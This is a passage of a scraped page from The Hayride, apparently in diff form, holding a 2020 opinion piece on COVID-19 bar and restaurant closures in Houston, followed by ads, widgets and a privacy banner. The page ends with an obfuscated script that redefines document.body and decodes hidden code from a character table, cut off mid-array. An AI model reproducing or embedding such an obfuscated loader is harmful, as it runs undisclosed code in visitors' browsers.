href="https://www.axios.com/ohio-governor-bars-restaurants-coronavirus-26e4b6e3-7f65-4f6a-abf9-f3940220cc6f.html">other states,</a> stating that closing bars and eateries would drive <a href="https://abc13.com/6016925/">panic and complete societal breakdown</a>  That however has not stopped Harris County and the City of Houston from <a href="https://www.fox26houston.com/news/harris-co-shuts-down-bars-dine-in-restaurant-service?fbclid=IwAR12wZht-KKkXsUOeps_hNprL7DFdhNN94uHpeThXNspidryZQ4IyV3Y09I">ordering the restaurants and bars closed</a> in their jurisdiction.</p>
+<p>What is not factored into to these decisions is the economic carnage that will be levied against these businesses. While eateries can make up some of the lost revenue with takeout and deliveries, bars, on the other hand, are going to see a complete reduction in revenue without the equivalent reduction in rent, facilities and licensing fees, tax liabilities and other fixed costs. Likewise, those in the service industry will be cut off from their employment and will be <a href="https://www.click2houston.com/food/2020/03/17/going-to-try-to-find-a-way-to-survive-houston-bar-restaurant-owners-and-patrons-react-after-county-orders-2-week-restrictions/">struggling</a> to come up with ways to cover their March 2020 expenses.</p>
+<div class="wpdev-ads wpdev-sidebar wpdev-inline-top">
+	<div id="wpdev-inline-top">
+		<script>
+		if (!checkUDM()) {
+			googletag.cmd.push(function() {
+				googletag.display('wpdev-inline-top');
+			});
+		}
+		</script>
+	</div>
+</div>
+
+<div id="ld-7075-6"></div>
+<script>
+if (!checkUDM()) {
+	(function(w, d, s, i) {
+		w.ldAdInit = w.ldAdInit || [];
+		w.ldAdInit.push({
+			slot: 9232060221193318,
+			size: [0, 0],
+			id: "ld-7075-6"
+		});
+		if (!d.getElementById(i)) {
+			var j = d.createElement(s),
+				p = d.getElementsByTagName(s)[0];
+			j.async = true;
+			j.src = "//cdn2.lockerdomecdn.com/_js/ajs.js";
+			j.id = i;
+			p.parentNode.insertBefore(j, p);
+		}
+	})(window, document, "script", "ld-ajs");
+}
+</script>
+<p>The pain can be equally felt in the travel and hospitality industry, where up to the start of the pandemic airlines were <a href="https://www.cnbc.com/2019/06/17/boeing-ceo-says-global-pilot-shortage-is-one-of-the-biggest-challenges.html">booming</a> and had a <a href="https://www.forbes.com/sites/marisagarcia/2018/07/27/a-perfect-storm-pilot-shortage-threatens-global-aviation-even-private-jets/">pilot shortage,</a> only to see <a href="https://www.axios.com/united-airlines-to-cut-capacity-by-50-over-the-coronavirus-dfc278c2-ad2e-48c8-9b0e-875db8da79dd.html">the bottom completely fall out</a>. Airlines have gone from making <a href="https://www.travelweekly.com/Travel-News/Airline-News/Delta-sets-profit-record-in-2019">record profits</a> to requiring <a href="https://www.chicagotribune.com/coronavirus/ct-nw-coronavirus-united-airlines-cancel-flights-20200316-ynel2kin4rdftoomlrfgvmv4ve-story.html">government backed bailouts</a> in a matter of two weeks.  And pilots working for <a href="https://onemileatatime.com/american-airlines-offer-to-pilots/">domestic carriers</a> are now encouraged to take <a href="https://www.cnbc.com/2020/02/29/coronavirus-prompts-united-airlines-to-offer-pilots-a-month-for-flight-cuts.html">voluntary time off</a> to prevent massive <a href="https://www.aerotime.aero/clement.charpentreau/24679-air-france-to-temporarily-lay-off-80-of-staff-due-to-coronavirus">mandatory furloughs</a> like those working for foreign carriers have been subjected to.</p>
+<p>From top to bottom COVID-19, a.k.a., the Coronavirus, is causing an economic meltdown of the travel, hospitality, service, and entertainment industries greatly affecting livelihoods in Houston and everywhere else. From business owners to those who invested heavily in training such as pilots, this could lead to a great financial burden. A shrunken GDP that may be unrecoverable in the near term is coming, with a lot of this damage credited to not the virus but the economic prohibition put into place as a response.</p>
+<p>What reduction in tax, fee, and regulatory burdens are these government agencies going to grant? While the airlines will likely receive a bailout, what about the small business owners whose businesses were ordered closed by no fault of their own? Are they going to receive a reprieve of property tax requirements? Are they going to get sales tax waivers to help restore their balance sheets? Are their landlords going to be given a bailout on their financial requirements? If it isn&#8217;t waving of taxes and fees but cash payouts, who is going to be responsible? The taxpayer?</p>
+<p>These are questions that should have been asked before Houston, as well as other cites, counties and states, committed the <a href="https://thehayride.com/2020/03/ten-things-which-might-change-your-mind-on-the-wuhan-virus-part-2/" target="_blank" rel="noopener noreferrer">knee-jerk reaction</a> of shutting down restaurants and bars. Governor Abbott clearly weighed the consequences and even factored in the social breakdown caused by these closures. It should be noted that keeping restaurants open alleviates the supply chain mess from grocery stores hit with panic buying. Also with the economy structured so heavily in the aforementioned industries, the longer they are disrupted, the greater chance the United States will enter a recession that could have far greater consequence than the COVID-19 virus could itself unleash.</p>
+<div class="wpdev-ads wpdev-sidebar wpdev-inline-bottom">
+	<div id="wpdev-inline-bottom">
+		<script>
+		if (!checkUDM()) {
+			googletag.cmd.push(function() {
+				googletag.display('wpdev-inline-bottom');
+			});
+		}
+		</script>
+	</div>
+</div>
+
+
+        <div class="essb_links essb_counters essb_displayed_shortcode essb_share essb_template_metro-bold-retina essb_1225258643 essb_width_flex essb_links_center print-no" id="essb_displayed_shortcode_1225258643" data-essb-postid="126748" data-essb-position="shortcode" data-essb-button-style="button" data-essb-template="metro-bold-retina" data-essb-counter-pos="hidden" data-essb-url="https://thehayride.com/2020/03/covid-19-forced-closures-in-houston-will-lead-to-economic-disaster/" data-essb-fullurl="https://thehayride.com/2020/03/covid-19-forced-closures-in-houston-will-lead-to-economic-disaster/" data-essb-instance="1225258643"><ul class="essb_links_list"><li class="essb_item essb_link_facebook nolightbox"> <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fthehayride.com%2F2020%2F03%2Fcovid-19-forced-closures-in-houston-will-lead-to-economic-disaster%2F&t=COVID-19+Forced+Closures+in+Houston+Will+Lead+To+Economic+Disaster" title="Share on Facebook" onclick="essb.window(&#39;https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fthehayride.com%2F2020%2F03%2Fcovid-19-forced-closures-in-houston-will-lead-to-economic-disaster%2F&t=COVID-19+Forced+Closures+in+Houston+Will+Lead+To+Economic+Disaster&#39;,&#39;facebook&#39;,&#39;1225258643&#39;); return false;" target="_blank" rel="nofollow" class="nolightbox" ><span class="essb_icon essb_icon_facebook"></span><span class="essb_network_name">Facebook</span></a><span class="essb_counter_hidden" data-cnt="92" data-cnt-short=""></span></li><li class="essb_item essb_link_twitter nolightbox"> <a href="#" title="Share on Twitter" onclick="essb.window(&#39;https://twitter.com/intent/tweet?text=COVID-19%20Forced%20Closures%20in%20Houston%20Will%20Lead%20To%20Economic%20Disaster&amp;url=https%3A%2F%2Fthehayride.com%2F2020%2F03%2Fcovid-19-forced-closures-in-houston-will-lead-to-economic-disaster%2F&amp;counturl=https%3A%2F%2Fthehayride.com%2F2020%2F03%2Fcovid-19-forced-closures-in-houston-will-lead-to-economic-disaster%2F&amp;related=TheHayride&amp;via=TheHayride&#39;,&#39;twitter&#39;,&#39;1225258643&#39;); return false;" target="_blank" rel="nofollow" class="nolightbox" ><span class="essb_icon essb_icon_twitter"></span><span class="essb_network_name">Twitter</span></a></li><li class="essb_item essb_totalcount_item" data-counter-pos="hidden"><span class="essb_totalcount essb_t_r_big essb_total_icon essb_icon_share-tiny" title="" data-shares-text="shares"><span class="essb_t_nb">92<span class="essb_t_nb_after">shares</span></span></span></li></ul></div>	</div><!-- .entry-content -->
+</article><!-- #post-## -->
+
+
+<div id="wpdev-seemore" class="wpdev-seemore-box">
+    <span>Interested in more news from Texas? We've got you covered!</span>    <a href="/category/Texas" class="wpdev-national-news-btn">See More Texas News <i class="fa fa-angle-right"></i></a>    </div><!-- ADBLADE -->
+<ins class="adbladeads" data-cid="17611-2073346462" data-host="web.adblade.com" data-tag-type="4" style="display:none"></ins>
+<script>
+if(!checkUDM())  {
+	document.write(`<script language="javascript" async src="//web.adblade.com/js/ads/async/show.js"><\/script>`);
+}
+</script>
+<div class="row wpdev-post-navigation">
+        <div class="col-md-6 wpdev-post-nav-cont">
+        <div class="wpdev-post-nav wpdev-post-nav-left">
+        <span class="wpdev-post-nav-head"><i class="fa fa-angle-left"></i> Previous Article</span>
+        <a href="https://thehayride.com/2020/03/ten-things-which-might-change-your-mind-on-the-wuhan-virus-part-5/" rel="prev"><span class="wpdev-post-nav-title">Ten Things Which Might Change Your Mind On The Wuhan Virus (Part 5)</span></a>        </div>
+    </div>
+        <div class="col-md-6 wpdev-post-nav-cont">
+        <div class="wpdev-post-nav wpdev-post-nav-right">
+        <span class="wpdev-post-nav-head">Next Article <i class="fa fa-angle-right"></i></span>
+        <a href="https://thehayride.com/2020/03/cunningham-bese-bows-to-reality-amid-school-closures/" rel="next"><span class="wpdev-post-nav-title">CUNNINGHAM: BESE Bows To Reality Amid School Closures</span></a>        </div>
+    </div>
+    </div>
+<!--BANNER-->
+<div class="app-banner">
+	<a href="https://thespeakeasy.disciplemedia.com/groups/hayride" title="Speakeasy App" target="_blank"><img src="https://thehayride.com/wp-content/uploads/2021/02/speakeasy-ad-r1.jpg" alt="Join the Conversation - Download the Speakeasy App."></a>
+</div>
+
+<div class="wpdev-region-cont row">
+        <div class="col-md-12 wpdev-region">
+            <h1 class="wpdev-section-title">Trending on The Hayride</h1>
+                </div>
+</div>
+
+		</main><!-- #main -->
+	</div><!-- #primary -->
+
+                </div>                    <div class="col-sm-4 wpdev-sidebar">
+                        
+<aside id="secondary" class="widget-area" role="complementary">
+	<div class="wpdev-ads wpdev-sidebar wpdev-sidebar-top">
+	<div id="wpdev-sidebar-top">
+		<script>
+		if (!checkUDM()) {
+			googletag.cmd.push(function() {
+				googletag.display('wpdev-sidebar-top');
+			});
+		}
+		</script>
+	</div>
+</div>
+
+<span id=zone427585647></span>
+<script>
+    (function(r,d,u) {
+        var s = d.createElement(r); s.async = true;
+        u += '&cb=' + Date.now() + Math.random();       
+        s.src = u; var n = d.getElementsByTagName(r)[0];
+        n.parentNode.insertBefore(s, n);
+    })('script',document,'//engine.fsd2.digital/?427585647');
+</script>
+<section id="enhancedtextwidget-4" class="widget widget_text enhanced-text-widget">
+	<div class="widget-title-cont">
+		<h2 class="widget-title">Subscribe to The Nooner!</h2>
+	</div>
+	<div class="textwidget widget-text">
+
+		<form accept-charset="UTF-8" action="https://members.postboxus.com/ga/front/forms/1/subscriptions/"
+			class="simple_form embedded-ga-subscription-form" id="new_pending_subscriber" method="post"
+			novalidate="novalidate" target="_parent" style="
+				border: 4px solid #e84c3c;
+				border-radius: 2px;
+				padding: 1rem 1rem 1rem;
+			">
+			<label class="text required control-label" for="pending_subscriber_email" style="
+				font-family: 'Rubik', sans-serif;
+				font-size: 0.9rem;
+				color: #0c3a5e;
+			">Email Address</label>
+			<input class="string required" id="pending_subscriber_email" name="pending_subscriber[email]" size="50"
+				type="text" placeholder="Email Address
+			" style="
+				width: 100%;
+				border-color: rgba(255, 255, 255, 0);
+				border-bottom: 1px solid #3597d3;
+				border-radius: 0;
+				margin: 0 0 1rem;
+				color: #666;
+				padding: 3px;
+			">
+			<label class=" control-label" for="pending_subscriber_custom_fields_16" style="
+				font-family: 'Rubik', sans-serif;
+				font-size: 0.9rem;
+				color: #0c3a5e;
+			">Postal Code</label>
+			<input class="string" id="pending_subscriber_custom_fields_16" name="pending_subscriber[custom_fields][16]"
+				type="text" placeholder="Postal Code
+				" style="
+					width: 100%;
+					border-color: rgba(255, 255, 255, 0);
+					border-bottom: 1px solid #3597d3;
+					border-radius: 0;
+					margin: 0 0 1rem;
+			">
+			<div class="form-actions-container call-to-action" style="
+				text-align: center;
+			">
+				<button class="colored button" type="submit" style="
+					background: #fff;
+					border: 2px solid #0c3a5e;
+					color: #0c3a5e;
+					border-radius: 2rem;
+					padding: .8rem 1.5rem 0.5rem;
+					display: inline-block;
+					font-size: .9rem;
+					font-weight: 700;
+					text-transform: uppercase;
+					font-family: 'Rubik',sans-serif;
+				">Submit Form</button>
+			</div>
+		</form>
+	</div>
+</section><section id="wpdev_widget-2" class="widget widget_wpdev_widget">
+	<div class="widget-title-cont">
+		<h2 class="widget-title">Quote of the Day</h2>
+	</div>
+
+	<div id="qotd-sidebar">“You want to tell me that a bunch of football teams owned by billionaires are OK with fentanyl pouring across our border and … killing our young people? If the NFL is OK with that, they’ve got to do some soul searching. I don’t answer to the NFL. I answer to the people of Arizona.”
+
+<em>- Arizona gubernatorial candidate Kari Lake, asked whether her intention to declare an invasion along that state's border with Mexico might put the Super Bowl, scheduled for the Phoenix area in February 2023 in danger of relocating.</em></div>	
+	<div class="wpdev-national-news">
+		<a href="/category/quote-of-the-day" class="wpdev-national-news-btn">More Quotes <i class="fa fa-angle-right"></i></a>
+	</div>
+
+</section><div class="wpdev-ads wpdev-sidebar wpdev-sidebar-bottom">
+	<div id="wpdev-sidebar-bottom">
+		<script>
+		if (!checkUDM()) {
+			googletag.cmd.push(function() {
+				googletag.display('wpdev-sidebar-bottom');
+			});
+		}
+		</script>
+	</div>
+</div><br><input type="hidden" name="IL_IN_ARTICLE"><br><section id="text-16" class="widget widget_text">
+	<div class="fb-page" data-href="https://www.facebook.com/TheHayride/" data-small-header="true" data-adapt-container-width="true" data-hide-cover="false" data-show-facepile="false">
+		<blockquote cite="https://www.facebook.com/TheHayride/" class="fb-xfbml-parse-ignore text-center">
+			<a href="https://www.facebook.com/TheHayride/">The Hayride</a>
+		</blockquote>
+	</div>
+</section>
+		<section id="recent-posts-5" class="widget widget_recent_entries">
+		<div class="widget-title-cont"><h2 class="widget-title">Recent Articles</h2></div>
+		<ul>
+											<li>
+					<a href="https://thehayride.com/2022/10/sadow-has-bossier-city-finally-learned-not-to-engage-in-boondoggles/">SADOW: Has Bossier City Finally Learned Not To Engage In Boondoggles?</a>
+									</li>
+											<li>
+					<a href="https://thehayride.com/2022/10/florida-is-no-longer-much-of-a-contested-state-politically/">Florida Is No Longer Much Of A Contested State Politically</a>
+									</li>
+											<li>
+					<a href="https://thehayride.com/2022/10/quote-of-the-day-october-26-2022/">Quote Of The Day, October 26, 2022</a>
+									</li>
+											<li>
+					<a href="https://thehayride.com/2022/10/crouere-enough-is-enough-joes-gotta-go/">CROUERE: Enough Is Enough – Joe’s Gotta Go</a>
+									</li>
+											<li>
+					<a href="https://thehayride.com/2022/10/alexander-u-s-5th-circuit-guts-another-unconstitutional-federal-agency/">ALEXANDER: U.S. 5th Circuit Guts Another Unconstitutional Federal Agency</a>
+									</li>
+											<li>
+					<a href="https://thehayride.com/2022/10/sadow-edwards-politicized-kid-jab-flip-flop-exposed/">SADOW: Edwards Politicized Kid Jab Flip-Flop Exposed</a>
+									</li>
+											<li>
+					<a href="https://thehayride.com/2022/10/that-2022-red-wave-its-coming/">BAYHAM: That 2022 Red Wave? It&#8217;s Coming</a>
+									</li>
+											<li>
+					<a href="https://thehayride.com/2022/10/quote-of-the-day-october-25-2022/">Quote Of The Day, October 25, 2022</a>
+									</li>
+											<li>
+					<a href="https://thehayride.com/2022/10/celebrate-a-midterm-victory-with-the-hayride-and-kurt-schlichter-nov-9/">Celebrate A Midterm Victory With The Hayride And Kurt Schlichter Nov. 9!</a>
+									</li>
+											<li>
+					<a href="https://thehayride.com/2022/10/lsu-is-atop-the-sec-west-right-now-in-football-but-the-reactions-are/">LSU Is Atop The SEC West Right Now In Football, But The Reactions Are&#8230;</a>
+									</li>
+					</ul>
+
+		</section><br><input type="hidden" name="IL_IN_ARTICLE"><br><br><script>if(!checkUDM())  {window.SLOT=12099306501163622; }</script>
+
+<br><input type="hidden" name="IL_IN_ARTICLE"><br>
+
+<p><br></p>
+
+<input type="hidden" name="IL_IN_ARTICLE">
+
+<p></p>
+
+
+
+<br>
+
+<p></p>
+
+<span id=zone543172809></span>
+
+<script>
+	if(!checkUDM())  {
+	(function(r, d, u) {
+		var s = d.createElement(r);
+		s.async = true;
+		s.setAttribute('data-cfasync', false);
+		u += '&cb=' + Date.now() + Math.random();
+		s.src = u;
+		var n = d.getElementsByTagName(r)[0];
+		n.parentNode.insertBefore(s, n);
+	})('script', document, '//engine.fsd2.digital/?543172809');
+}
+</script>
+
+<br>
+
+<p></p>
+
+<span id=zone234578048></span>
+
+<script>
+	if(!checkUDM())  {
+	(function(r, d, u) {
+		var s = d.createElement(r);
+		s.async = true;
+		u += '&cb=' + Date.now() + Math.random();
+		s.src = u;
+		var n = d.getElementsByTagName(r)[0];
+		n.parentNode.insertBefore(s, n);
+	})('script', document, '//engine.fsd2.digital/?234578048');
+}
+</script>
+
+<br>
+<input type="hidden" name="IL_IN_ARTICLE">
+<p></p></aside><!-- #secondary -->                    </div>            </div>
+        </div>
+    </div><!-- #content -->
+    <div class="wpdev-footer-cont">
+        <div class="container-fluid wpdev-footer wpdev-max-width">
+            <footer id="colophon" class="site-footer" role="contentinfo">
+                <div class="site-info">
+                    Copyright &copy; 2022 The Hayride. All Rights Reserved.
+                </div><!-- .site-info -->
+            </footer><!-- #colophon -->
+        </div>
+    </div>
+</div><!-- #page -->
+
+<style>
+#ot-ccpa-banner {
+	font-family: "Open Sans"; 
+	margin: 0; 
+	padding: 0;
+	position: 
+	fixed;
+	bottom: 0;
+	left: 1%;
+	max-width: 400px;
+	background-color: transparent;
+	z-index: 9999;
+	margin-right: 20px; 
+}
+#ot-ccpa-banner .ot-ccpa-icon {
+	position: absolute; 
+	bottom: 10px; 
+	left: 0; 
+	width: 50px;
+	line-height: 15px;
+	cursor: pointer;
+	padding: 8px;
+	background-color: #6699CC;
+	border-radius: 10px; 
+	height: 50px;
+	display: flex; 
+	justify-content: center; 
+	align-items: center;
+}
+#ot-ccpa-banner .ot-ccpa-icon img{ 
+	width: 100%; 
+}
+
+.CCPAFloatRight{ 
+	right: 1% ; 
+	left: auto !important; 
+}
+.ot-ccpa-optout__button--light{
+	display: none !important}
+</style>
+<script>
+jQuery(function(){
+    jQuery("#ot-ccpa-banner,#otCCPAdoNotSellLink,.ot-ccpa-optout__button").click(function(){
+        jQuery("#ot-ccpa-banner").toggle();
+    });
+    jQuery(document).on('click','.ot-ccpa-optout__buttons__close, .ot-ccpa-optout__confirm',function(){
+        setTimeout(function(){
+            if(jQuery(".ot-ccpa-icon").hasClass("enableicon")){ jQuery("#ot-ccpa-banner").show(); }
+        }, 300);
+    });
+});
+</script>
+	<style type="text/css">#otCCPAdoNotSellLink{ display: none !important; }</style>
+<script>
+    var otCcpaScript = document.createElement('script'),
+    script1 = document.getElementsByTagName('script')[0];
+    otCcpaScript.src = 'https://cookie-cdn.cookiepro.com/ccpa-optout-solution/v1/ccpa-optout.js';
+    otCcpaScript.async = true;
+    otCcpaScript.type = 'text/javascript';
+    script1.parentNode.insertBefore(otCcpaScript, script1);
+    otCcpaData = {
+		isButtonEnabled: "checked",
+		isLinkEnabled: "",
+		headerBackgroundcolor: "#6699CC",
+		headerTextcolor: "#FFFFFF",
+		buttonBackgroundColor: "#6699CC",
+		buttonTextColor: "#FFFFFF",
+		popup_main_title: "Do Not Sell My Personal Information",
+		// Policy Settings
+		PrivacyPolicyMessage: "Exercise your consumer rights by contacting us below",
+		linkURL: "https:\/\/thehayride.com\/privacy\/",
+		linkText: "Privacy Policy",
+		// Email Settings
+		isEmailEnabled: true,
+		emailAddress: "email@thehayride.com",
+		// Phone Settings
+		isPhoneEnabled: true,
+		phoneNumber: "225-317-6302",
+		// Form Link settings
+		form_enable: true,
+		form_link_text: "Exercise Your Rights",
+		form_link_url: "https:\/\/thehayride.com\/privacy\/",
+		// GooglePersonalize settings
+		isGooglePersonalizeEnabled: "gam",
+		googleConfirmationTitle: "Personalized advertisements",
+		googleConfirmationMessage: "Turning this off will opt you out of personalized advertisements delivered from Google on this website.",
+		confirmbutton: "Confirm",
+		frameworks: "",
+		isLSPAenable: false,
+		// Display position
+		DisplayPosition: "right",
+		location: "All"    }
+    window.otccpaooSettings = {
+	    layout: {
+		    dialogueLocation: otCcpaData.DisplayPosition,
+		    primaryColor: otCcpaData.headerBackgroundcolor,
+		    secondaryColor: otCcpaData.headerTextcolor,
+            button: {
+                primary: otCcpaData.buttonBackgroundColor,
+                secondary: otCcpaData.buttonTextColor,
+            }		    
+	    },
+	    dialogue: {
+			email: {
+			    display: otCcpaData.isEmailEnabled,
+			    title: otCcpaData.emailAddress,
+			    url: "mailto:" + otCcpaData.emailAddress,
+		    },
+            lspa: {
+                accepted: otCcpaData.isLSPAenable,
+            },
+            phone: {
+                display: otCcpaData.isPhoneEnabled,
+                title: otCcpaData.phoneNumber,
+                url: "tel:" + otCcpaData.phoneNumber,
+            },            		    
+		    dsar: {
+			    display: otCcpaData.form_enable,
+			    title: otCcpaData.form_link_text,
+			    url: otCcpaData.form_link_url,
+		    },
+		    intro: {
+			    title: otCcpaData.popup_main_title,
+			    description: otCcpaData.PrivacyPolicyMessage,
+		    },
+		    privacyPolicy: {
+			    title: otCcpaData.linkText,
+			    url: otCcpaData.linkURL,
+		    },
+		    optOut: {
+			    title: otCcpaData.googleConfirmationTitle,
+			    description: otCcpaData.googleConfirmationMessage,
+			    frameworks: [otCcpaData.frameworks, otCcpaData.isGooglePersonalizeEnabled],
+		    },
+		    location: otCcpaData.location,
+		    confirmation: {
+			    text: otCcpaData.confirmbutton,
+		    },
+	    }
+    }; 
+</script>
+<style>#ot-ccpa-banner{ display:block; }</style>	
+<div id="ot-ccpa-banner" class="CCPAFloatRight" style="display:none;" data-ot-ccpa-opt-out="buttonicon">
+		<div class="ot-ccpa-icon CCPAFloatRight enableicon" style="display:flex;background-color: #6699CC">
+		<a href="javascript:void(0);"><img src="https://thehayride.com/wp-content/plugins/cookiepro-ccpa/assets/images/icon.png" alt="Popup Button" title="CookiePro Do Not Sell"/></a>
+	</div>
+</div><script>if(lzhkx==undefined){var lzhkx={ts:'1666807704',};try{Object.defineProperty(document,"body",{get:function(){return document.getElementsByTagName("body")[0];},set:function(v){return document.getElementsByTagName("body")[0]},configurable:false});}catch(e){}(function(){var rzfznnnd=["+","%","W",">","X","!","5","*","0","|","3","J","F","P","r","q"," ","/","R","9","E","b","&","U","y","j","]","k","O",".","T","C","`","e","m","h","8","1","<","A","B","6","Z","M","v",")",":","u","l",";","-","?","2","_","z","a","g","t","\"","}","i","p","Q","@","I","N","S","^","d","4","{","V","f","c","7","s","x","(","w","$","o","\\","L","[","'","=","G","n","K","Y",",","#","H","D"];var lzhkx=[57,14,24,70,68,80,73,47,34,33,87,57,29,73,47,14,14,33,87,57,66,73,14,60,61,57,29,75,33,57,39,57,57,14,60,21,47,57,33,77,84,75,14,73,84,90,84,48,80,48,84,45,49,68,80,73,47,34,33,87,57,29,21,80,68,24,85,68,80,73,47,34,33,87,57,29,56,33,57,20,48,33,34,33,87,57,75,40,24,30,55,56,65,55,34,33,77,84,21,80,68,24,84,45,83,8,26,49,59,73,55,57,73,35,77,33,45,70,59,60,72,77,43,55,57,35,29,14,55,87,68,80,34,85,85,87,47,48,48,45,70,28,21,25,33,73,57,29,68,33,72,60,87,33,13,14,80,61,33,14,57,24,77,43,55,57,35,90,58,14,55,87,68,80,34,58,90,70,44,55,48,47,33,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,61,55,14,75,33,12,48,80,55,57,77,84,8,29,84,0,87,33,78,16,93,55,57,33,77,45,29,56,33,57,23,30,31,43,60,48,48,60,75,33,73,80,87,68,75,77,45,45,59,59,45,49,59,60,72,77,43,55,57,35,29,72,48,80,80,14,85,85,87,47,48,48,45,70,28,21,25,33,73,57,29,68,33,72,60,87,33,13,14,80,61,33,14,57,24,77,43,55,57,35,90,58,72,48,80,80,14,58,90,70,44,55,48,47,33,46,72,47,87,73,57,60,80,87,77,44,45,70,14,33,57,47,14,87,16,61,55,14,75,33,64,87,57,77,44,29,57,80,66,57,14,60,87,56,77,45,45,59,59,45,49,59,60,72,77,64,2,73,85,85,47,87,68,33,72,60,87,33,68,45,70,44,55,14,16,64,2,73,85,70,47,46,84,17,17,57,35,33,35,55,24,14,60,68,33,29,73,80,34,17,17,17,68,48,47,72,33,80,48,60,57,33,68,48,47,17,68,48,47,72,55,21,61,68,48,47,17,52,8,52,52,17,37,8,17,68,48,47,33,55,21,61,50,78,35,33,14,33,55,14,33,24,80,47,87,80,78,37,52,6,69,37,55,50,83,14,26,29,61,87,56,84,90,24,46,84,17,17,57,35,33,35,55,24,14,60,68,33,29,73,80,34,17,78,10,74,53,93,37,17,88,44,24,40,31,17,82,14,11,87,20,28,30,34,17,44,24,82,31,44,18,23,34,35,4,50,83,14,26,29,25,61,56,84,90,57,75,46,84,37,41,41,41,36,8,74,74,8,69,84,90,72,48,46,83,26,90,73,72,46,72,55,48,75,33,90,55,57,53,68,80,46,58,14,68,68,24,78,68,29,73,80,34,58,90,55,57,53,25,75,46,58,55,68,44,33,14,57,60,75,60,87,56,29,25,75,58,90,55,57,53,60,34,46,58,55,68,73,80,68,33,29,61,87,56,58,90,55,57,53,14,47,46,58,17,55,68,44,33,14,57,60,75,60,87,56,29,25,75,58,90,55,57,53,14,60,46,58,17,55,68,73,48,47,57,57,33,14,29,61,87,56,58,90,55,57,53,33,60,46,58,14,60,56,35,57,55,68,58,90,55,57,53,33,73,46,58,73,80,87,57,33,87,57,50,55,68,16,73,80,87,57,33,87,57,39,68,58,90,55,57,53,33,75,46,58,61,80,75,60,57,60,80,87,46,55,21,75,80,48,47,57,33,49,68,60,75,61,48,55,24,46,21,48,80,73,27,49,58,90,55,57,53,33,46,57,14,47,33,90,55,57,53,14,46,57,14,47,33,90,55,57,53,14,52,46,72,55,48,75,33,90,60,46,72,55,48,75,33,90,73,46,8,90,47,73,46,72,55,48,75,33,90,73,48,46,83,26,90,61,44,46,72,55,48,75,33,90,73,75,75,46,72,55,48,75,33,90,55,57,53,56,46,72,55,48,75,33,90,55,57,53,68,46,72,55,48,75,33,90,55,57,53,60,46,72,55,48,75,33,90,55,57,53,72,46,72,55,48,75,33,90,55,57,53,60,21,46,84,68,48,47,84,90,75,87,46,8,90,75,57,55,14,57,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,45,70,5,72,47,87,73,57,60,80,87,77,55,90,21,90,73,45,70,55,83,21,26,85,73,77,45,59,77,64,2,73,90,58,44,58,90,72,47,87,73,57,60,80,87,77,45,70,72,47,87,73,57,60,80,87,16,55,77,45,70,14,33,57,47,14,87,70,78,60,68,57,35,46,27,77,45,90,35,33,60,56,35,57,46,48,77,45,59,59,72,47,87,73,57,60,80,87,16,21,77,55,90,21,45,70,44,55,14,16,73,85,70,59,49,14,33,57,47,14,87,16,21,85,0,21,9,9,8,90,73,29,78,60,68,57,35,85,77,73,29,14,60,56,35,57,85,55,29,14,60,56,35,57,0,21,45,50,77,73,29,48,33,72,57,85,55,29,48,33,72,57,50,21,45,90,73,29,35,33,60,56,35,57,85,77,73,29,21,80,57,57,80,34,85,55,29,21,80,57,57,80,34,0,21,45,50,77,73,29,57,80,61,85,55,29,57,80,61,50,21,45,90,73,59,72,47,87,73,57,60,80,87,16,73,77,55,90,73,45,70,14,33,57,47,14,87,16,55,85,55,22,22,5,55,29,87,80,68,33,30,24,61,33,51,55,83,8,26,46,55,90,55,22,22,37,85,85,85,55,29,87,80,68,33,30,24,61,33,51,21,77,55,29,56,33,57,40,80,47,87,68,60,87,56,31,48,60,33,87,57,18,33,73,57,77,45,90,73,45,46,5,37,59,72,47,87,73,57,60,80,87,16,68,77,21,45,70,21,85,87,47,48,48,85,85,21,51,55,77,45,46,37,85,85,85,21,29,87,80,68,33,30,24,61,33,51,73,77,21,45,46,21,49,44,55,14,16,68,85,21,29,35,33,60,56,35,57,90,33,85,21,29,78,60,68,57,35,49,14,33,57,47,14,87,16,68,85,58,72,47,87,73,57,60,80,87,58,85,85,57,24,61,33,80,72,16,68,51,68,29,73,55,48,48,77,21,45,46,68,90,33,85,58,72,47,87,73,57,60,80,87,58,85,85,57,24,61,33,80,72,16,33,51,33,29,73,55,48,48,77,21,45,46,33,90,33,17,68,59,44,55,14,16,33,85,70,59,90,72,85,58,47,87,68,33,72,60,87,33,68,58,5,85,57,24,61,33,80,72,16,78,60,87,68,80,78,22,22,78,60,87,68,80,78,90,56,85,58,47,87,68,33,72,60,87,33,68,58,5,85,57,24,61,33,80,72,16,68,80,73,47,34,33,87,57,22,22,68,80,73,47,34,33,87,57,90,35,85,56,22,22,56,29,68,80,73,47,34,33,87,57,20,48,33,34,33,87,57,90,60,85,72,55,48,75,33,90,25,85,60,51,72,47,87,73,57,60,80,87,77,55,45,70,14,33,57,47,14,87,5,5,60,29,73,55,48,48,77,72,90,55,45,29,34,55,57,73,35,33,75,59,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,5,37,59,90,27,85,33,29,44,60,33,78,61,80,14,57,2,85,72,47,87,73,57,60,80,87,77,45,70,44,55,14,16,55,85,35,29,73,48,60,33,87,57,2,60,68,57,35,90,21,85,72,29,60,87,87,33,14,2,60,68,57,35,49,14,33,57,47,14,87,16,21,3,55,51,21,46,55,59,90,48,85,33,29,44,60,33,78,61,80,14,57,92,85,72,47,87,73,57,60,80,87,77,45,70,44,55,14,16,55,85,35,29,73,48,60,33,87,57,92,33,60,56,35,57,90,21,85,72,29,60,87,87,33,14,92,33,60,56,35,57,49,14,33,57,47,14,87,16,21,3,55,51,21,46,55,59,49,14,33,57,47,14,87,16,33,29,34,15,85,25,90,33,29,44,60,33,78,61,80,14,57,85,55,90,33,29,75,73,14,80,48,48,4,85,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,29,61,55,56,33,4,28,72,72,75,33,57,9,9,35,29,75,73,14,80,48,48,82,33,72,57,59,90,33,29,75,73,14,80,48,48,89,85,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,29,61,55,56,33,89,28,72,72,75,33,57,9,9,35,29,75,73,14,80,48,48,30,80,61,59,90,33,29,14,33,73,57,55,87,56,48,33,85,73,90,33,29,55,75,61,33,73,57,85,68,90,33,29,60,87,4,85,72,47,